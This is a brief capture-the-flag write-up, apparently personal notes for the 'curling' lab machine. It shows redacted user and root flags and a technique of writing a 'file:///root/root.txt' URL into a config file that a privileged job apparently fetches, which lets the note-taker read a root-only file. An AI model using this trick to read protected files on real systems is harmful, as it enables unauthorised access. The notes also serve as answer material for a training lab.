# user flag
Retrieved credentials for `floris` user, see [[04 - Joomla]] 
```
floris@curling:~$ cat user.txt 
8b<SNIP>69
```

# root flag
It is possible to read root files (see [[05 - shell - floris]]). There is no id_rsa key for root, but the flag can be grabbed.
```
floris@curling:~/admin-area$ echo -n 'url = "file:///root/root.txt"' > input 

### Wait a minute...

floris@curling:~/admin-area$ cat input 
url = "file:///root/root.txt"
floris@curling:~/admin-area$ head -n 1 report 
9<SNIP>4
```